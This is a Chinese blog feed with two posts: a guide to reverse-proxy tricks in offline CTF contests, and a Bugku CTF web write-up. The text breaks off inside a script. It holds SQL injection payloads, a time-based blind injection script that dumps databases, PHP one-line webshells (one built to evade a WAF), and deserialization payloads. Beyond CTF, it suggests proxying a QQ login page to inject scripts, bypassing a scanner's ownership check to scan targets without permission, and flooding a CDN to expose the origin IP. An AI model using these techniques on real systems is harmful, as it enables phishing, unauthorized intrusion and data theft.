CTF线下中的一些思路因为我们线下赛中每支队伍的web站点都一样，笔者在之前的一次线下训练赛的时候尝试过修改apache配置文件来反代分数最高的队伍的站点，从而达到流量转发(伤害转移)的效果。这个具体能不能实现得看服务器的权限能提升到多高，其次也得根据具体的check机制来灵活使用。如果提升的权限不够高的话，也可以配置.htaccess来实现反代。用tcpdump倒流量顺手抓一波别人的payload。如果我们采用的是.htaccess方法进行反向代理，这里说一下这种方法的原理和其他的不同在于它本质上是利用.htaccess映射到一个php文件，然后利用php文件去抓取目标服务器的信息返回给客户端。这里.htaccess配置的作用是重写url。所以我们不妨在这个php文件中包含一下这个demo1.php即可达到payload的记录的效果： 代码如下：demo1.php12345678910111213141516171819202122232425262728&lt;?phpwrite_log();function get_http_raw() &#123; $raw = ''; $raw .= $_SERVER['REQUEST_METHOD'].' '.$_SERVER['REQUEST_URI'].' '.$_SERVER['SERVER_PROTOCOL']."\r\n"; foreach($_SERVER as $key =&gt; $value) &#123; if(substr($key, 0, 5) === 'HTTP_') &#123; $key = substr($key, 5); $key = str_replace('_', '-', $key); $raw .= $key.': '.$value."\r\n"; &#125; &#125; $raw .= "\r\n"; $raw .= file_get_contents('php://input'); return $raw;&#125;function write_log()&#123; $data = date("Y/m/d H:i:s")."\r\n".get_http_raw()."\r\n\r\n"; $file = fopen('log1.txt', 'a'); //日志路径 fwrite($file, $data); fclose($file); &#125; 记录如下: 克隆网站 –中间人攻击我们可以安装一个nginx的第三方模块ngx_http_substitutions_filter_module,然后nginx的配置文件中加入一段，即可弹窗等。 1subs_filter &lt;/head&gt; &quot;&lt;script&gt;alert(&apos;1&apos;);&lt;/script&gt;&lt;/head&gt;&quot;; location部分的配置如下： 这里有个坑弄了我好久… 就是我们请求网站的时候，数据包头部一般会有Accept-Encoding部分，如下图所示，这个部分告诉服务器，客户端能以怎样的形式解码。那么问题来了，数据包是压缩的，我们怎样才能用subs_filter 替换其中的内容呢？ 其实正像上面截图的配置那样设置：反代服务器请求上游服务器的时候带上Accept-Encoding=‘ ’ 即可，表示不接受任何压缩数据。 访问https://a.cuit.store,效果如下： 这样如果我们反代一个登录页面，比如qq空间，然后植入我们的js脚本，后果emmm…当然了，不同站的反代难度是不一样的~ 绕过网站所有权验证，调用在线的云扫描器给我们需要渗透的网站进行扫描以人人扫这个云扫描平台为例：https://www.renrenscan.com/， 其中需要我们把一个认证文件放到网站根目录上，我们可以设置反代规则的时候，对这个文件进行排除，不进行代理即可绕过，或者直接用.htaccess的方法进行反代就行。这样我们只需要等待扫描结果，即可get目标站的漏洞了~ 如果我们再邪恶一点….顺便也可以包含上demo1.php，把这些扫描的payload都导出来下来(手动滑稽) ps：这里说点其他的，我发现在给我博客加cdn的时候，发现了如下图所示的这个，因为我用的是cloudflare免费版的套餐，可以看到有很多请求没有经过CDN处理就直接回源了，这就可以让我们想到如果我们渗透的站点是套了CDN的，常规的找邮件服务器，静态文件，ssrf啥的如果都不管用，还不如来点简单粗暴的，暴力发包让CDN承受不住而回源，这样真实ip’轻松’get~ 0x04: 反向代理不当一般当我们遇到了反代服务器的时候，可以试着用burpsuite的repeat功能，设置host为反代服务器，然后把http请求中的路径改为内网中的host(一般需要穷举，穷举网段ip端口域名等等)。因为反向代理的本质就是将客户端的请求url重写后发往上游服务器，将返回结果发回客户端，在这之中，如果对路径的配置不当就有可能导致反向代理变正向代理导致一些信息泄露，内网穿透等等漏洞。 参考：陌陌web服务器Path处理不当可以正向代理内网穿透代理洞谷歌内部主机信息泄露漏洞新浪HTTP代理配置不当漫游内网挖洞经验之代理不当日进内网 还有一种就是nginx为Django做反代的时候，静态文件配置错误导致源码泄露 ##0x05: 如何防止被反向代理反向代理不仅会对用户造成威胁，而且对服务器来说也会增强负载，还有就是通过代理的方式盗取网站数据，还有就是seo相关的影响了等等… 通过js防止反代：如果地址栏的网址不是www.passer6y.fun那么就进行跳转。12345&lt;script type=&quot;text/javascript&quot;&gt;if (document.domain !=&apos;www.passer6y.fun&apos;)&#123; window.location.href=&apos;https://www.passer6y.fun/&apos;;&#125;&lt;/script&gt; 其实这种方法还是可以绕过的，nginx有扩展模块可以将指定的字符进行替换，这时我们只需将target域名替换成我们自己的就行了(上文有说到如何替换)。或者直接不代理这个js文件也行。 php 123456&lt;?php if($_SERVER[&apos;SERVER_NAME&apos;] != &apos;www.passer6y.fun&apos; ) &#123; header(&apos;Location: https://www.passer6y.fun/&apos;);&#125; ?&gt; .htaccess .htaccess123RewriteEngine On RewriteBase / php_value auto_append_file proxy.php proxy.php12345678&lt;?php $f = getenv(“HTTP_X_FORWARDED_FOR”); $server = getenv(“HTTP_HOST”); if (($f!=””)&amp;&amp;($server!=”www.passer6y.fun”)&#123; echo ‘本服务器禁止恶意反向代理！’; &#125; ?&gt; 0x06: Apache 反代配置方法1. windows下：修改配置文件：Apache\conf\httpd.conf，将以下两个前面的注释符去掉。12#LoadModule proxy_module modules/mod_proxy.so#LoadModule proxy_http_module modules/mod_proxy_http.so 然后新增一个Apache\conf\vhosts.conf文件123456789101112131415161718192021&lt;VirtualHost *:80&gt; ServerAdmin admin # 域名信息 ServerName passer6y.cn # 邮件信息 ProxyRequests Off &lt;Proxy *&gt; Order deny,allow Allow from all &lt;/Proxy&gt; ProxyPass / https://passer6y.cn/ # 将一个远端服务器映射到本地服务器的URL空间 ProxyPassReverse / https://passer6y.cn/ # 调整由反向代理服务器发送的HTTP回应头中的URL。 &lt;/VirtualHost&gt; 2. linux下 参考：https://www.leaseweb.com/labs/2014/12/tutorial-apache-2-4-transparent-reverse-proxy/测试环境：Ubuntu 16.04，apache2加载”proxy_http”模块：12sudo a2enmod proxy_httpsudo service apache2 restart 在/etc/apache2/sites-available/下，修改配置：123456&lt;VirtualHost *:80&gt; ProxyPreserveHost On ProxyPass / https://192.168.83.1/ # 指定根URL(/)下的内容映射到给定地址的后端服务器 ProxyPassReverse / https://192.168.83.1/ &lt;/VirtualHost&gt;~ 重启apache生效配置：12sudo service apache2 reloadsudo service apache2 restart 3. .htaccess配置反向代理这种方法配置反向代理准确的说是php反向代理，我们通过.htaccess中配置一些重写规则，然后把请求映射到一个php文件中，这个php帮我们请求上游服务器的内容，然后将上游服务器的返回的内容获取回来发回客户端。这种配置反代的好处是所需权限比较小，但是也有很多弊端，随着网站的复杂度，我们所写的抓取页面的php脚本难度就不大一样了。 Github上放了3个php反代脚本的demo，使用说明也见里面的readme即可。 ##0x07 nginx 反向代理 1. 简单反代Nginx核心配置文件nginx.conf：123456789 server &#123; listen 80; # 监听端口(web服务端口) server_name localhost; # 当前服务的域名，这里是本地测试 location / &#123; # 这里的/ 表示把服务器的根目录反代到www.baidu.com的根目录。 proxy_pass https://www.baidu.com; proxy_redirect default; &#125;&#125; 2. 实例：反代Google 测试环境：cent os7条件准备：一个域名，OneinStack一键安装lnmp，Let’s Encrypt 的ssl证书 接下来编辑nginx下的主机配置文件：/usr/local/nginx/conf/vhost/然后在最后插入：1234567location / &#123; proxy_set_header Host &quot;www.google.com&quot;; proxy_set_header User-Agent $http_user_agent; proxy_set_header Connection &quot;&quot;; proxy_http_version 1.1; proxy_pass https://www.google.com;&#125; 检测Nginx配置是否正确：123[root@vultr vhost]# nginx -tnginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful 重载Nginx服务：12[root@vultr vhost]# service nginx reloadReloading nginx configuration (via systemctl): [ OK ] 打开google.cuit.store，成功~ 0x08 结语这次介绍了我所了解的三种反代情况以及其中一些有意思的玩法。笔者能力有限，第一次写文章有什么理解不对的地方还请大家多多指点！]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku Write Up]]></title>
    <url>%2F2018%2F07%2F04%2Fbugkuwp%2F</url>
    <content type="text"><![CDATA[之前刷过的bugku，这次把之前的解题思路过程都总结到一起了，差不多有40道吧应该算比较全了。本文属i春秋原创奖励计划，原文链接 Bugku Write Up前言之前刷过的bugku，这次把之前的解题思路过程都总结到一起了，差不多有40道吧应该算比较全了。 报错 题目说：访问参数为：?id=x不允许包含“–”，空格，单引号，双引号，“union”关键字，查询文件中包含“”（双引号）里面的内容，需要查询的文件路径为：/var/test/key_1.php 针对上述过滤，我们可以采用如下办法绕过： 空格：/**/ --：用# union: uni%00on 引号：hex编码 下面就可以开心的玩耍了~爆库:1https://103.238.227.13:10088/id=0x3122/**/and/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x3a(select/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/0,1),floor(rand()*2),0x3a,0x3a/**/)name/**/from/**/information_schema.tables/**/group/**/by/**/name)/**/b)/**/# 发现第二个数据库：sql41不过flag并不在这，他让我们查询文件路径。参考这篇文章总结的12个错方式floor报错怎么也读不出文件，于是试了一下extractvalue报错：1https://103.238.227.13:10088/?id=0x3122/**/and/**/extractvalue(1,concat(0x5c,(select/**/hex(load_file(0x2f7661722f746573742f6b65795f312e706870)))))/**/# 这里得把load_file()整个函数给hex编码，不然不知道为啥，不出数据读出flag：不过,这只是其中的一节，我们还得想办法弄到后面的字符，这里采用substr()： 1https://103.238.227.13:10088/?id=0x3122/**/and/**/extractvalue(1,concat(0x5c,(select/**/concat(0x5c,substr((load_file(0x2f7661722f746573742f6b65795f312e706870)),100,30),0x5c)),0x5c))/**/# 截断几次后可以看到flag： 这题真坑啊，要用中文的两个右双引号包裹才能成功交上去…Flag:”7249f5a7fd1de602b30e6f39aea6193a” insert into 参考文章： https://jingyan.baidu.com/article/f71d6037a577291ab741d14a.html https://jingyan.baidu.com/article/f71d6037a577291ab741d14a.html https://www.jianshu.com/p/232071aa51ba 题示信息：1234567891011121314151617181920212223flag格式：flag&#123;xxxxxxxxxxxx&#125;不如写个Python吧error_reporting(0);function getIp()&#123;$ip = '';if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123;$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;else&#123;$ip = $_SERVER['REMOTE_ADDR'];&#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); 根据题示信息可以知道：只有插入。没有输出，可以用时间盲注。时间盲注就是在之后返回的内容相同，没法进行判断的时候；在mysql数据库中插入sleep()函数，如果()语句能正确执行的话，&amp;&amp;就不会短路，sleep()可以执行，这样响应时间就会增大；而()发生错误没有返回结果时，&amp;&amp;会把sleep()函数短路无法执行；伪造请求头：X-Forwarded-For: 1’ and sleep(5) and ‘1’ = ‘1注意不能用来括号闭合 ！！脚本如下: 当初想的是自动化脱裤…代码有点简陋，需要完善的地方还是挺多的。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# encoding:utf-8import requests,time,stringcharacters = string.ascii_letters + string.digits + string.punctuationmax_length = 50target = 'https://120.24.86.145:8002/web15/'cur_database = "'+(select case when (substring((select database() ) from &#123;0&#125; for 1)='&#123;1&#125;') " \ "then sleep(4) else 1 end) and '1'='1"# 猜解字母def get(payload): flag = '' for i in range(1, max_length): # i 表示了所要查找的名字的最大长度 next_position = False for char in characters: # 0x80=128 , 0x20=32, 32-128为可显示的字符的区间 payload_ = payload.format(str(i), char) headers = &#123; 'X-Forwarded-For': payload_ &#125; try: r = requests.get(target,headers=headers,timeout=4) except requests.exceptions.ReadTimeout: flag += char print(flag) next_position = True break if not next_position: return flag# 指定数据库，获取其下全部表名def get_table(database): for i in range(0,5): print("正在查询数据库" + database + "中的表") payload = "'+(select case when (substring((" \ "select table_name from information_schema.tables where table_schema='"+ database + "' limit 1 offset "+ str(i) +") " \ "from &#123;0&#125; for 1)='&#123;1&#125;') " \ "then sleep(4) else 1 end) and '1'='1" table = get(payload) print( "数据库" + database + "的第"+ str(i+1) +"个表"+table) get_col(table) if not table: print('数据库'+database+'中的表查询完毕') break# 查字段def get_col(table): for i in range(0,5): print("正在查询表" + table + "中的字段") payload = "'+(select case when (substring((" \ "select column_name from information_schema.columns where table_name='"+ table +"' limit 1 offset "+ str(i) +") " \ "from &#123;0&#125; for 1)='&#123;1&#125;') " \ "then sleep(4) else 1 end) and '1'='1" column = get(payload) print("表" + table + "的第" + str(i+1) + "个字段为" + column ) # print(column) if not column: print("表" + table + "中的字段查询完毕") break# # 作为单独的模块使用吧,获取字段详细信息# def result(column,table):# payload = "'+(select case when (substring((select "+column+" from "+table+") from &#123;0&#125; for 1)='&#123;1&#125;') " \# "then sleep(4) else 1 end) and '1'='1"# print(get(payload))# a = 'flag'# result(a,a)if __name__ == "__main__": database1 = get(cur_database) table1 = get_table(database1) 最后使用上面被注释掉的那个模块，获取flag：flag{cdbf14c9551d5be5612f7bb5d2867853} sql2 题示信息： hint：全都tm过滤了绝望吗？ 提示 !,!=,=,+,-,^,%这题当时我用brup爆破被过滤的字符也注了很久，sqlmap也跑了就是跑不出上面长度370的是都被过滤了的。后来还是放弃了，去看了下wp，发现还是我太天真了，是.DS_Store源码泄露题。 .DS_Store文件泄露利用简介DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄露，特别是备份文件、源代码文件 .DS_Store文件泄露利用这里使用ds_store_exp脚本利用。 1python ds_store_exp.py 120.24.86.145:8007/web2/.DS_Store 效果： 当然在这之前需要：使用工具nikto对该网页进行扫描，可以发现/web2/子目录下有.DS_Store文件泄露的漏洞 备份是个好习惯这里推荐一个CTF中常见的源码泄露利用工具，其实就是一个爆破字典拿到一个index.php.bak 123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 弱类型数组绕过：1https://120.24.86.145:8002/web16/index.php?kekeyy1[]=0&amp;kkeyey2[]=a Flag:Bugku{OH_YOU_FIND_MY_MOMY} 求getshell文件上传题：初步认定，黑名单+content-type验证，上传.htaccess可以成功但是会被改名图片马也上了，没地方包含…感觉题目有点奇怪。。看了wp之后 改的是表单提交的Content-Type: MUltipart/form-data 进行大小写绕过…. 文件包含2看源码：文件上传，传了个&lt;?php phpinfo()?&gt; 过滤了&lt;?，但是&lt;没过滤…..传了个一句话木马1&lt;script language=php&gt;eval($_POST['A'])&lt;/script&gt; 菜刀连不上，试试命令执行。123&lt;script language=php&gt; system("ls")&lt;/script&gt; 看到flag123&lt;script language=php&gt;system("cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt")&lt;/script&gt; SKCTF{uP104D_1nclud3_426fh8_is_Fun} 这是一个神奇的登陆框burp抓包分析，有回显的盲注，改一下上面那个脚本就行，这里直接导出数据包直接跑sqlmap1SQLmap.py -r &quot;path&quot; -p admin_name --dbs cookies欺骗题目地址：https://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=这样访问进去：显示一行乱七八糟的字母filename后参数base64解密：keys.txt 这里就得想一下用这个方法看index.php，base64编码后https://120.24.86.145:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw这里还有一个lne参数，控制代码行数，用脚本把源码拿出来：12345678910# encoding:utf-8import requests,reline = 1while line &lt; 100: url = 'https://120.24.86.145:8002/web11/index.php?line='+str(line) +'&amp;filename=aW5kZXgucGhw' s = requests.session() responce = s.get(url) print(responce.text) line = line + 1 源码如下：1234567891011121314151617&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 伪造cookie ：margin=margin 访问：/web11/index.php?line=&amp;filename=a2V5cy5waHA 其中a2V5cy5waHA 是keys.php base64加密后的得到flag：&lt;?php $key=’KEY{key_keys}’; ?&gt; flag在index里面点一点链接，url变成了：1https://120.24.86.145:8005/post/index.php?file=show.php 这样应该就是php，包含了我们get输入的file参数。问题是他说flag在index.php，我怎么样都读不出。后来想到文件包含里面可以用PHP的filter来读php文件(不需要allow_url_include)：1file=php://filter/read=convert.base64-encode/resource=./index.php base64解密后：123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data"))&#123; echo "Oh no!"; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; flag{edulcni_elif_lacol_si_siht} nerver give up看源码：1p.html被跳转了，View-source: 看源码 得到：123456789101112131415161718&lt;HTML&gt;&lt;HEAD&gt;&lt;SCRIPT LANGUAGE="Javascript"&gt;&lt;!--var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;/BODY&gt;&lt;/HTML&gt; 解码后：1234567891011121314151617181920212223242526272829303132var Words ="&lt;script&gt;window.location.href='https://www.bugku.com';&lt;/script&gt; ";if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')) //不区分大小写的，返回第一个.的位置 这里不能有“.”&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r'); //加上@屏蔽错误信息if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt;function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt; 关键的一段需要绕过的地方：1if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) eregi有%00截断的漏洞，$data参数在前面配合file_get_contents()函数，我们可以php://input传入：payload:12hello.php?id=%00&amp;a=php://input&amp;b=%0012345post_data：bugku is a nice plateform! flag{tHis_iS_THe_fLaG} SQL约束攻击 参考： https://www.freebuf.com/articles/web/124537.htmlSQL约束攻击：攻击者使用任意身份的登录的漏洞 12345678910111213141516171819202122&lt;?php// Checking whether a user with the same username exists$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT * FROM users WHERE username='$username'";$res = mysql_query($query, $database);if($res) &#123; if(mysql_num_rows($res) &gt; 0) &#123; // User exists, exit gracefully . . &#125; else &#123; // If not, only then insert a new entry $query = "INSERT INTO users(username, password) VALUES ('$username','$password')"; . . &#125;&#125; 验证登录信息的页面：1234567891011121314&lt;?php$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT username FROM users WHERE username='$username' AND password='$password' ";$res = mysql_query($query, $database);if($res) &#123; if(mysql_num_rows($res) &gt; 0)&#123; $row = mysql_fetch_assoc($res); return $row['username']; &#125;&#125;return Null; 原理：这里这行select语句：SELECT FROM users WHERE username=’vampire ‘;和这句的效果是一样的：SELECT FROM users WHERE username=’vampire’;SQL执行字符串处理时，字符串末尾的空格会被去除。 在insert查询中，SQL会根据varchar(n)来限制字符串的最大长度，也就是说大于n的话就只取前n个字符。 下面如果我们用”admin 1”和随便一个密码 来注册一个号子，对于注册界面的select语句，它并没有查到数据库中有该用户，所以成功绕过，运行到后面的insert语句的时候，只会插入前n个字符，所以当空格足够多的时候，相当于插入了一个”admin “接下来到登录的页面，用admin和之前随便输入的密码进行登录的时候，搜索该用户名SELECT查询都将返回第一个数据记录。这样的话就可以使用原始用户身份登录。 防御办法：将名字那列加上UNIQUE约束，使之不能插入另一条记录，检测到两个相同的字符串，并insert查询失败。 flag: SKCTF{4Dm1n_HaV3_GreAt_p0w3R} Web8 题示信息：txt？？？？123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; extract($_GET)注册变量绕过办法：ac=aa&amp;f=php://inputdata=aa 后来还知道 访问flag.txt后出现flags (个人觉得，这种方法纯属取巧，很难知道目录下有flag.txt文件的）https://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt 其实不难发现，上面几个题都出现了file_get_contents函数，而且都和php伪协议有关，这意味着，以后碰到这个函数可以多往这个方面想想 welcome to bugku查看源码：1234567891011121314you are not the number of bugku ! &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 既然要用伪协议传入welcome to the bugkuctf，那么就可以用php://filter/convert.base64-encode/resource=hint.php读出hint.php（直接读是读不出来的） 得到：1PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA== base64解码后：123456789101112&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; __tostring：字符操作时触发()。用这种伪协议读文件的方法的时候：一定要想着多看几个文件,像index.php(robots.txt) 不能漏12345678910111213141516171819202122https://120.24.86.145:8006/test1/txt=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php&amp;password=123&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; echo $password 会触发__tostring所以file参数写包含hint.php，txt还是之前的伪协议不变，password就用以下脚本传入flag.php，序列化的数据12345678910111213141516&lt;?phpclass Flag&#123; public $file = 'Flag.php'; public function __tostring() &#123; if (isset($this-&gt;file)) &#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125;&#125;$a = new Flag();echo serialize($a);?&gt; password = O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} payload:12https://120.24.86.145:8006/test1/?txt=php://input&amp;file=php://filter/convert.base64-encode/resource=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;data：welcome to the bugkuctf 拿到flagflag{php_is_the_best_language} 本地包含题目源码：123456&lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__);?&gt; 使用?hello=file(‘flag.php’)或者?hello=show_source(‘flag.php’) 等可以读取源码的函数或者构造var_dump($a) 闭合 成绩单过滤了–+，已判断字段4个1id=-2&apos; union select 1,2,3,database() # 查出数据库：skctf_flag1id=-2&apos; union select 1,2,3,table_name from information_schema.tables where table_schema=&apos;skctf_flag&apos; # 查出表：fl4g1id=-2&apos; union select 1,2,3,column_name from information_schema.columns where table_name=&apos;fl4g&apos; # 查出字段skctf_flag1id=-2&apos; union select 1,2,skctf_flag,4 from skctf_flag.fl4g # 查出flag：BUGKU{Sql_INJECT0N_4813drd8hz4} 各种绕过源码：12345678910111213141516171819 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 两个不相等的值，但sha1相等：一样用数组绕过即可获得flag 过狗一句话题示信息：送给大家一个过狗一句话1&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 1https://120.24.86.145:8010/index.php?s=phpinfo() 执行成功 但是菜刀连不上，估计是限制了权限。试了n久之后，看了wp用的print_r(glob(‘*.php’));读取敏感文件1Array ( [0] =&gt; 2.php [1] =&gt; 3.php [2] =&gt; 4.php [3] =&gt; 5.php [4] =&gt; a.php [5] =&gt; c.php [6] =&gt; chaoba1.php [7] =&gt; chaoba2.php [8] =&gt; ddee.php [9] =&gt; f.php [10] =&gt; h.php [11] =&gt; haha.php [12] =&gt; index.php [13] =&gt; ll.php [14] =&gt; oudeniu.php [15] =&gt; phpspy1.php [16] =&gt; q.php [17] =&gt; t2.php [18] =&gt; txxxc.php [19] =&gt; x.php [20] =&gt; xxoo.php [21] =&gt; xxoos.php [22] =&gt; zx.php ) 尝试：print_r(glob(‘*.txt’))1Array ( [0] =&gt; NewFile.txt [1] =&gt; a.txt [2] =&gt; flag.txt [3] =&gt; testfile.txt ) 尝试：print_r(file(“./flag.txt”))1Array ( [0] =&gt; BUGKU&#123;bugku_web_009801_a&#125; ) 前女友123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; v1和v2比：数组绕过v3 strcmp()绕过：用数组即可1payload： https://118.89.219.210:49162/?v1[]=123&amp;v2[]=ads&amp;v3[]=123 flag：SKCTF{Php_1s_tH3_B3St_L4NgUag3} 秋名山老司机算术题，刷新一次变一次，多刷新几次会发现：让我们把答案在2秒内以value为参数post上去：12345678910111213# encoding:utf-8import requests,reurl = 'https://120.24.86.145:8002/qiumingshan/'s = requests.Session()responce = s.get(url)final = 